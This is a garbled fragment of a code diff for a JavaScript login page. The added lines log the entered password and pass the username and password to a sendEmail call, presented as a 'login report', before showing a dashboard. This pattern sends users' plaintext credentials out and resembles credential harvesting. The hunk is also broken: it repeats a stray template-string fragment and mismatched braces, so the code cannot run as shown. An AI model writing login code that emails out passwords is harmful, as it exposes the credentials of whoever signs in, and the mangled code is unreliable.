@@ -120,6 +120,19 @@
         alert("Please enter both username and password.");
     }
 }, Password: ${password}, Logged in at: ${new Date().toLocaleString()}`);
+        console.log("Updated loginHistory:", loginHistory);
+
+        sendEmail(username, password).then(() => {
+            document.getElementById("login").style.display = "none";
+            document.getElementById("dashboard").style.display = "block";
+        }).catch(error => {
+            console.error("Error sending email", error);
+            alert("Failed to send login report. Please try again.");
+        });
+    } else {
+        alert("Please enter both username and password.");
+    }
+}, Password: ${password}, Logged in at: ${new Date().toLocaleString()}`);
                 console.log("Updated loginHistory:", loginHistory);
                 sendEmail(username, password);
             } else {
